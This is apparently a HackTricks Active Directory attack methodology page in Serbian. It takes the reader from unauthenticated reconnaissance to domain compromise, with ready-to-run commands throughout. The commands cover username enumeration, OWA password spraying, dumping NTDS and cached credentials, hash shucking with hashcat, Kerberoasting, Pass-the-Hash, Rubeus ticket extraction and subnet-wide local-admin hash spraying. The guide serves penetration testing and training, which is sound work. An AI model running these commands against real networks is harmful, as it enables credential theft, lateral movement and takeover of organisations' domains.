# Active Directory Metodologija

{{#include ../../banners/hacktricks-training.md}}

## Osnovni pregled

**Active Directory** služi kao osnovna tehnologija, omogućavajući **mrežnim administratorima** da efikasno kreiraju i upravljaju **domenima**, **korisnicima** i **objektima** unutar mreže. Projektovan je za skaliranje, olakšavajući organizaciju velikog broja korisnika u upravljive **grupe** i **podgrupe**, uz kontrolu **prava pristupa** na različitim nivoima.

Struktura **Active Directory** se sastoji od tri primarna sloja: **domeni**, **stabla** i **šume**. **Domen** obuhvata skup objekata, kao što su **korisnici** ili **uređaji**, koji dele zajedničku bazu podataka. **Stabla** su grupe ovih domena povezane zajedničkom hijerarhijom, dok **šuma** predstavlja skup više stabala međusobno povezanih putem **odnosa poverenja**, formirajući najviši nivo organizacione strukture. Specifična **prava pristupa** i **komunikaciona prava** mogu se dodeljivati na svakom od ovih nivoa.

Ključni koncepti u okviru **Active Directory** uključuju:

1. **Directory** – Sadrži sve informacije u vezi sa Active Directory objektima.
2. **Object** – Oznaka za entitete unutar direktorijuma, uključujući **korisnike**, **grupe** ili **deljene foldere**.
3. **Domain** – Služi kao kontejner za objekate direktorijuma; moguće je imati više domena unutar **šume**, pri čemu svaki održava sopstveni skup objekata.
4. **Tree** – Grupisanje domena koja dele zajednički root domen.
5. **Forest** – Najviši nivo organizacione strukture u Active Directory, sastavljen od više stabala sa **odnosima poverenja** među njima.

**Active Directory Domain Services (AD DS)** obuhvata niz servisa ključnih za centralizovano upravljanje i komunikaciju u mreži. Ovi servisi uključuju:

1. **Domain Services** – Centralizuje skladištenje podataka i upravlja interakcijama između **korisnika** i **domena**, uključujući **autentikaciju** i funkcije pretrage.
2. **Certificate Services** – Upravljanje kreiranjem, distribucijom i održavanjem sigurnih **digitalnih sertifikata**.
3. **Lightweight Directory Services** – Podrška aplikacijama koje koriste direktorijum putem **LDAP protokola**.
4. **Directory Federation Services** – Omogućava **single-sign-on** za autentikaciju korisnika između više web aplikacija u jednoj sesiji.
5. **Rights Management** – Pomaže u zaštiti autorskih materijala regulisanjem njihove neovlašćene distribucije i upotrebe.
6. **DNS Service** – Ključan za rešavanje **domain name**.

Za detaljnije objašnjenje pogledajte: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Da biste naučili kako da napadnete AD, morate veoma dobro razumeti proces **Kerberos autentikacije**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Možete pogledati [https://wadcoms.github.io/](https://wadcoms.github.io) za brz pregled komandi koje možete pokrenuti da biste enumerisali/eksploatisali AD.

> [!WARNING]
> Kerberos komunikacija zahteva potpuno kvalifikovano ime (FQDN) za obavljanje akcija. Ako pokušate da pristupite mašini preko IP adrese, koristiće se NTLM umesto Kerberos-a.

## Recon Active Directory (No creds/sessions)

Ako imate pristup AD okruženju ali nemate kredencijale/sesije, možete:

- **Pentest the network:**
- Skanirajte mrežu, pronađite mašine i otvorene portove i pokušajte da **eksploatisete ranjivosti** ili **ekstrahujete kredencijale** sa njih (na primer, [štampači mogu biti veoma interesantni ciljevi](ad-information-in-printers.md)).
- Enumeracija DNS-a može dati informacije o ključnim serverima u domenu kao što su web, štampači, deljeni resursi, vpn, media, itd.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Pogledajte Generalnu [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) stranicu za više informacija kako ovo raditi.
- **Proverite null i Guest pristup na smb servisima** (ovo neće raditi na modernim verzijama Windows-a):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Detaljniji vodič o tome kako enumerisati SMB server možete pronaći ovde:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Detaljniji vodič o tome kako enumerisati LDAP možete pronaći ovde (obrati **posebnu pažnju na anonimni pristup**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Prikupite kredencijale lažiranjem servisa pomoću Responder-a (impersonating services with Responder)
- Pristupite hostu zloupotrebom relay attack
- Prikupite kredencijale eksponiranjem lažnih UPnP servisa pomoću evil-S **SDP** (exposing fake UPnP services with evil-S) [**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Ekstrahujte korisnička imena/ime i prezime iz internih dokumenata, društvenih mreža, servisa (pre svega web) unutar domen okruženja kao i iz javno dostupnih izvora.
- Ako pronađete puna imena zaposlenih, možete pokušati različite AD konvencije imenovanja korisnika ([**pročitajte ovo**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najčešće konvencije su: _NameSurname_, _Name.Surname_, _NamSur_ (3 slova od oba), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _slova i 3 broja_ (abc123).
- Alati:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Pogledajte stranice o [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Kada se zatraži **nevažeće korisničko ime**, server će odgovoriti koristeći **Kerberos error** kod _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, što nam omogućava da utvrdimo da je korisničko ime nevažeće. **Važeća korisnička imena** će izazvati ili **TGT u AS-REP** odgovoru ili grešku _KRB5KDC_ERR_PREAUTH_REQUIRED_, što ukazuje da je od korisnika zahtevan pre-authentication.
- **No Authentication against MS-NRPC**: Korišćenjem auth-level = 1 (No authentication) protiv MS-NRPC (Netlogon) interfejsa na domain controller-ima. Metoda poziva funkciju `DsrGetDcNameEx2` nakon bindovanja MS-NRPC interfejsa da proveri da li korisnik ili računar postoji bez ikakvih kredencijala. Alat [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementira ovaj tip enumeracije. Istraživanje se može pronaći [ovde](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ako pronađete jedan od ovih servera u mreži, možete takođe izvršiti **user enumeration against it**. Na primer, možete koristiti alat [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Možete pronaći liste korisničkih imena u [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  i ovom ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Međutim, trebalo bi da imate **imena ljudi koji rade u kompaniji** iz recon koraka koji ste prethodno trebalo da sprovedete. Sa imenom i prezimenom možete koristiti skript [**namemash.py**](https://gist.github.com/superkojiman/11076951) da generišete potencijalno važeća korisnička imena.

### Poznavanje jednog ili više korisničkih imena

U redu, dakle već imate važeće korisničko ime, ali nemate lozinke... Onda pokušajte:

- [**ASREPRoast**](asreproast.md): Ako korisnik **nema** atribut _DONT_REQ_PREAUTH_ možete **zahtevati AS_REP poruku** za tog korisnika koja će sadržati neke podatke šifrovane derivatom korisničke lozinke.
- [**Password Spraying**](password-spraying.md): Pokušajte najčešće **lozinke** za svakog otkrivenog korisnika — možda neki koristi lošu lozinku (imajte na umu politiku lozinki!).
- Imajte na umu da takođe možete **spray OWA servers** da pokušate dobiti pristup korisničkim mail serverima.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Možda ćete uspeti da dobijete neke challenge **hashes** koje možete crack-ovati izvođenjem **poisoning** nekih protokola u mreži:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ako ste uspeli da enumerišete active directory imaćete **više email-ova i bolje razumevanje mreže**. Možda ćete moći da izvršite NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) da biste dobili pristup AD okruženju.

### NetExec workspace-driven recon & relay posture checks

- Koristite **`nxcdb` workspaces** da čuvate AD recon stanje po angažmanu: `workspace create <name>` kreira per-protocol SQLite DBs pod `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Prebacujte prikaze sa `proto smb|mssql|winrm` i listajte prikupljene tajne sa `creds`. Ručno obrišite osetljive podatke kada završite: `rm -rf ~/.nxc/workspaces/<name>`.
- Brzo otkrivanje subnet-a pomoću **`netexec smb <cidr>`** prikazuje **domain**, **OS build**, **SMB signing requirements**, i **Null Auth**. Članovi koji prikazuju `(signing:False)` su **relay-prone**, dok DCs često zahtevaju signing.
- Generišite **hostnames in /etc/hosts** direktno iz NetExec izlaza da olakšate targetiranje:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Kada je **SMB relay to the DC is blocked** zbog signing, i dalje proverite **LDAP** posture: `netexec ldap <dc>` ističe `(signing:None)` / weak channel binding. DC koji zahteva SMB signing, ali ima onemogućen LDAP signing, i dalje je prihvatljiv cilj za **relay-to-LDAP** zloupotrebe kao što je **SPN-less RBCD**.

### Na strani klijenta: printer credential leaks → masovna validacija domen kredencijala

- Printer/web UIs ponekad **embed masked admin passwords in HTML**. Pregled source/devtools može otkriti cleartext (e.g., `<input value="<password>">`), omogućavajući Basic-auth pristup scan/print repozitorijumima.
- Dohvaćeni print jobs mogu sadržati **plaintext onboarding docs** sa lozinkama po korisniku. Prilikom testiranja držite parove usklađenim:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Krađa NTLM kredencijala

Ako možeš da pristupiš drugim računarima ili share-ovima kao null ili guest korisnik, možeš postaviti fajlove (npr. SCF fajl) koji, ako se nekako pristupi njima, pokrenu NTLM autentikaciju prema tebi tako da možeš ukrasti NTLM challenge da ga razbiješ:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tretira svaki NT hash koji već poseduješ kao kandidat lozinke za druge, sporije formate čiji se ključni materijal direktno izvodi iz NT hasha. Umesto brutalnog probijanja dugih lozinki u Kerberos RC4 tiketima, NetNTLM izazovima ili keširanim kredencijalima, ubacuješ NT hash-ove u Hashcat’s NT-candidate mode-ove i dozvoljavaš mu da potvrdi ponovno korišćenje lozinke bez ikada saznanja plaintext-a. Ovo je posebno moćno nakon kompromitovanja domena gde možeš sakupiti na hiljade trenutnih i istorijskih NT hash-eva.

Koristi shucking kada:

- Imaš NT korpus iz DCSync, SAM/SECURITY dump-ova ili credential vault-ova i treba ti testiranje za reuse u drugim domenima/forest-ovima.
- Uhvatite RC4-baziran Kerberos materijal (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM odgovore, ili DCC/DCC2 blob-ove.
- Želiš brzo dokazati reuse za duge, neprobijive passphrase-ove i momentalno pivot-ovati putem Pass-the-Hash.

Tehnika **ne radi** protiv encryption tipova čiji se ključevi ne izvode iz NT hasha (npr. Kerberos etype 17/18 AES). Ako domen forsira samo AES, moraš se vratiti na regularne password mode-ove.

#### Building an NT hash corpus

- **DCSync/NTDS** – Koristi `secretsdump.py` sa history opcijom da uzmeš što veći skup NT hash-eva (i njihovih prethodnih vrednosti):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History unosi značajno proširuju pool kandidata jer Microsoft može skladištiti do 24 prethodna hasha po nalogu. Za više načina da harvest-uješ NTDS sekrete vidi:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ili Mimikatz `lsadump::sam /patch`) izvlači lokalne SAM/SECURITY podatke i keširane domen logone (DCC/DCC2). Dedupiliraj i dodaj te hash-e u isti `nt_candidates.txt`.
- **Praćenje metadata** – Čuvaj username/domain koji je proizveo svaki hash (čak i ako wordlist sadrži samo hex). Poklapanje hash-eva odmah ti govori koji principal ponovo koristi lozinku kada Hashcat prikaže pobedničkog kandidata.
- Preferiraj kandidate iz istog foresta ili iz trusted foresta; to maksimalizuje šansu za overlap prilikom shuck-ovanja.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate input-i **moraju ostati raw 32-hex NT hash-evi**. Isključi rule engine (bez `-r`, bez hybrid moda) jer mangling kvari kandidatni ključni materijal.
- Ovi modovi nisu inherentno brži, ali NTLM keyspace (~30,000 MH/s na M3 Max) je ~100× brži od Kerberos RC4 (~300 MH/s). Testiranje kuriranog NT lista je mnogo jeftinije nego istraživanje celog password prostora u sporom formatu.
- Uvek koristi **najnoviju Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) jer su mode-ovi 31500/31600/35300/35400 nedavno dodati.
- Trenutno ne postoji NT mode za AS-REQ Pre-Auth, a AES etype-ovi (19600/19700) zahtevaju plaintext lozinku jer se njihovi ključevi izvode preko PBKDF2 iz UTF-16LE lozinki, a ne iz raw NT hash-eva.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat izvodi RC4 ključ iz svakog NT kandidata i validira `$krb5tgs$23$...` blob. Poklapanje potvrđuje da servisni nalog koristi jedan od tvojih postojećih NT hash-eva.

3. Odmah pivot-uj putem PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcionalno možeš kasnije da povratiš plaintext sa `hashcat -m 1000 <matched_hash> wordlists/` ako je potrebno.

#### Example – Cached credentials (mode 31600)

1. Dump-uj cached logone sa kompromitovane radne stanice:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopiraj DCC2 liniju za interesantnog domen korisnika u `dcc2_highpriv.txt` i shuck-uj je:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Uspešno poklapanje daje NT hash koji je već poznat u tvojoj listi, dokazujući da keširani korisnik ponovo koristi lozinku. Iskoristi ga direktno za PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ili ga bruteforce-uj u brzom NTLM modu da povratiš string.

Isti workflow važi i za NetNTLM challenge-response (`-m 27000/27100`) i DCC (`-m 31500`). Kada se identifikuje poklapanje, možeš pokrenuti relay, SMB/WMI/WinRM PtH, ili ponovo crack-ovati NT hash offline koristeći maske/rule.

## Enumeracija Active Directory-a SA kredencijalima/sesijom

Za ovu fazu treba da si kompromitovao kredencijale ili sesiju validnog domen naloga. Ako imaš neke validne kredencijale ili shell kao domain user, treba da imaš na umu da su opcije navedene ranije i dalje validne metode da kompromituješ druge korisnike.

Pre nego što počneš autentifikovanu enumeraciju treba da razumeš šta je **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeracija

Kompromitovanje naloga je veliki korak ka kompromitovanju čitavog domena, jer ćeš tada moći da pokreneš **Active Directory enumeraciju:**

Što se tiče [**ASREPRoast**](asreproast.md) sada možeš pronaći sve moguće ranjive korisnike, a što se tiče [**Password Spraying**](password-spraying.md) možeš dobiti **listu svih korisničkih imena** i probati lozinku kompromitovanog naloga, prazne lozinke i nove potencijalne lozinke.

- Možeš koristiti [**CMD za osnovni recon**](../basic-cmd-for-pentesters.md#domain-info)
- Takođe možeš koristiti [**powershell za recon**](../basic-powershell-for-pentesters/index.html) što će biti stealth-ier
- Možeš koristiti [**powerview**](../basic-powershell-for-pentesters/powerview.md) da izvadiš detaljnije informacije
- Još jedan odličan alat za recon u Active Directory-ju je [**BloodHound**](bloodhound.md). Nije **veoma stealthy** (u zavisnosti od metoda sakupljanja koje koristiš), ali **ako ti to nije bitno**, svakako ga isprobaj. Nađi gde korisnici mogu RDP-ovati, pronađi put do drugih grupa, itd.
- **Drugi automatizovani AD alati su:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS zapisi AD-a**](ad-dns-records.md) jer mogu sadržati interesantne informacije.
- Alat sa GUI koji možeš koristiti za enumeraciju direktorijuma je **AdExplorer.exe** iz **SysInternals** Suite-a.
- Takođe možeš pretraživati LDAP bazu koristeći **ldapsearch** da tražiš kredencijale u poljima _userPassword_ & _unixUserPassword_, ili čak u _Description_. vidi [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) za druge metode.
- Ako koristiš **Linux**, možeš takođe enumerisati domen koristeći [**pywerview**](https://github.com/the-useless-one/pywerview).
- Možeš pokušati i automatizovane alate kao što su:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Izdvajanje svih korisnika domena**

Veoma je lako dobiti sva korisnička imena domena iz Windows-a (`net user /domain` ,`Get-DomainUser` ili `wmic useraccount get name,sid`). U Linux-u možeš koristiti: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ili `enum4linux -a -u "user" -p "password" <DC IP>`

> Čak i ako ova sekcija Enumeracija izgleda mala, ovo je najvažniji deo od svega. Otvori linkove (uglavnom one za cmd, powershell, powerview i BloodHound), nauči kako da enumerišeš domen i vežbaj dok se ne osećaš komforno. Tokom assess-menta, ovo će biti ključni trenutak da nađeš put do DA ili da odlučiš da se ništa ne može uraditi.

### Kerberoast

Kerberoasting podrazumeva dobijanje **TGS tiketa** koje koriste servisi vezani za korisničke naloge i probijanje njihove enkripcije — koja se zasniva na korisničkim lozinkama — **offline**.

Više o tome u:


{{#ref}}
kerberoast.md
{{#endref}}

### Udaljene konekcije (RDP, SSH, FTP, Win-RM, itd)

Kada dobiješ neke kredencijale možeš proveriti da li imaš pristup nekom računaru. U tu svrhu možeš koristiti **CrackMapExec** da pokušaš povezivanje na više servera koristeći različite protokole, u skladu sa tvojim port scan-ovima.

### Lokalno eskaliranje privilegija

Ako si kompromitovao kredencijale ili sesiju kao regularni domain user i imaš **pristup** tim korisnikom nekom računaru u domenu, treba da pokušaš da nađeš način da **eskaliraš privilegije lokalno i loot-uješ kredencijale**. Samo sa lokalnim administratorskim privilegijama moći ćeš da **dump-uješ hash-eve drugih korisnika** iz memorije (LSASS) i lokalno (SAM).

U knjizi postoji kompletna stranica o [**lokalnom eskaliranju privilegija u Windows-u**](../windows-local-privilege-escalation/index.html) i [**checklist**](../checklist-windows-privilege-escalation.md). Takođe, ne zaboravi da koristiš [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Trenutni session tiketi

Veoma je **neverovatno** da ćeš naći **tickete** u trenutnom korisniku koji ti daju dozvolu za pristup neočekivanim resursima, ali možeš proveriti:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ako ste uspeli da enumerišete Active Directory imaćete **više emailova i bolje razumevanje mreže**. Možda ćete moći da prinuđete NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Traženje Creds u deljenjima računara | SMB Shares

Sada kada imate neke osnovne credentials trebalo bi da proverite da li možete **pronaći** bilo koje **interesantne fajlove koji se dele unutar AD-a**. Možete to raditi ručno, ali je to veoma dosadan ponavljajući zadatak (pogotovo ako nađete stotine dokumenata koje treba proveriti).

[**Kliknite na ovaj link da saznate koji alati su dostupni.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ako možete **pristupiti drugim PCs ili shares** možete **postaviti fajlove** (kao SCF fajl) koji, ako se na neki način otvore, će **pokrenuti NTLM authentication prema vama** tako da možete **steal** **NTLM challenge** da ga crack-ujete:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ova ranjivost je omogućavala bilo kojem autentifikovanom korisniku da **kompromituje kontroler domena**.


{{#ref}}
printnightmare.md
{{#endref}}

## Eskalacija privilegija na Active Directory SA privilegovanim credentials/session

**Za sledeće tehnike običan domain korisnik nije dovoljan — potrebne su posebne privilegije/credentials da biste izveli ove napade.**

### Hash extraction

Nadamo se da ste uspeli da **kompromitujete neki lokalni admin** nalog koristeći [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) uključujući relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Zatim je vreme da dump-ujete sve hash-ove iz memorije i lokalno.\
[**Pročitajte ovu stranicu o različitim načinima dobijanja hash-ova.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Kada imate hash korisnika**, možete ga koristiti da ga **impersonate**.\
Potrebno je koristiti neki **tool** koji će **izvršiti NTLM authentication koristeći** taj **hash**, **ili** možete kreirati novi **sessionlogon** i **inject** taj **hash** u **LSASS**, tako da kad se izvrši bilo koja **NTLM authentication**, taj **hash će biti korišćen.** Poslednja opcija je ono što radi mimikatz.\
[**Pročitajte ovu stranicu za više informacija.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ovaj napad ima za cilj da **iskoristi NTLM hash korisnika za zahtev Kerberos tiketa**, kao alternativa uobičajenom Pass The Hash preko NTLM protokola. Dakle, ovo može biti posebno **korisno u mrežama gde je NTLM protokol onemogućen** i gde je dozvoljen samo **Kerberos** kao protokol autentifikacije.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

U metodi napada **Pass The Ticket (PTT)**, napadači **ukradu korisnikov authentication ticket** umesto njegove lozinke ili hash vrednosti. Taj ukradeni tiket se potom koristi da **imitiraju korisnika**, stičući neautorizovan pristup resursima i servisima unutar mreže.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ako imate **hash** ili **password** lokalnog **administratora**, trebali biste pokušati da se **loginujete lokalno** na druge **PCs** koristeći ga.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Imajte na umu da je ovo prilično **bučno** i **LAPS** bi to **ublažio**.

### MSSQL Abuse & Trusted Links

Ako korisnik ima privilegije da **pristupi MSSQL instancama**, mogao bi da ih iskoristi za **izvršavanje komandi** na MSSQL hostu (ako proces radi kao SA), **ukradе** NetNTLM **hash** ili čak izvede **relay** **attack**.\
Takođe, ako je MSSQL instanca poverena (database link) od strane druge MSSQL instance, i korisnik ima privilegije nad tom poverenom bazom, on će moći da **iskoristi odnos poverenja da izvršava upite i u drugoj instanci**. Ovi trust-ovi se mogu ulančavati i u nekom trenutku korisnik može pronaći pogrešno konfigurisanu bazu gde može izvršavati komande.\
**Linkovi između baza rade čak i preko forest trust-ova.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory i deployment suite-ovi često otvaraju moćne puteve do kredencijala i izvršenja koda. Vidi:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ako nađete bilo koji Computer objekat sa atributom [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i imate domen privilegije na tom računaru, moći ćete da dump-ujete TGT-ove iz memorije svih korisnika koji se prijave na taj računar.\
Dakle, ako se **Domain Admin prijavi na taj računar**, moći ćete da dump-ujete njegov TGT i impersonirate ga koristeći [Pass the Ticket](pass-the-ticket.md).\
Zahvaljujući constrained delegation-u mogli biste čak **automatski kompromitovati Print Server** (nadamo se da će to biti DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ako je korisniku ili računaru dozvoljeno "Constrained Delegation" moći će da **impersonira bilo kog korisnika da pristupi nekim servisima na računaru**.\
Zatim, ako **kompromitujete hash** tog korisnika/računara bićete u mogućnosti da **impersonirate bilo kog korisnika** (čak i domain admine) da pristupite nekim servisima.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Imati **WRITE** privilegiju nad Active Directory objektom udaljenog računara omogućava postizanje izvršenja koda sa **povišenim privilegijama**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Kompromitovani korisnik može imati neke **zanimljive privilegije nad određenim domain objektima** što bi vam omogućilo da **pomaknete** lateralno/**eskalirate** privilegije kasnije.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Otkrivanje **Spool servisa koji sluša** unutar domena može se **zloupotrebiti** da se **nabave novi kredencijali** i **eskaliraju privilegije**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Ako **drugi korisnici** **pristupaju** **kompromitovanom** mašinom, moguće je **sakupiti kredencijale iz memorije** pa čak i **inject-ovati beacone u njihove procese** kako biste ih impersonirali.\
Obično korisnici pristupaju sistemu preko RDP-a, pa evo kako izvesti par napada nad tuđim RDP session-ima:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** obezbeđuje sistem za upravljanje **lokalnim Administrator password-om** na domen-pridruženim računarima, osiguravajući da je **nasumičan**, jedinstven i često **menjan**. Ovi password-i se čuvaju u Active Directory i pristup im kontrolišu ACL-ovi samo autorizovanih korisnika. Sa dovoljnim dozvolama za pristup ovim password-ima, pivotovanje na druge računare postaje moguće.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Prikupljanje sertifikata** sa kompromitovane mašine može biti način za eskalaciju privilegija unutar okruženja:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Ako su **ranjivi templates** konfigurisani, moguće ih je zloupotrebiti za eskalaciju privilegija:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Kada dobijete **Domain Admin** ili još bolje **Enterprise Admin** privilegije, možete **dump-ovati** **domain bazu**: _ntds.dit_.

[**Više informacija o DCSync attack-u može se naći ovde**](dcsync.md).

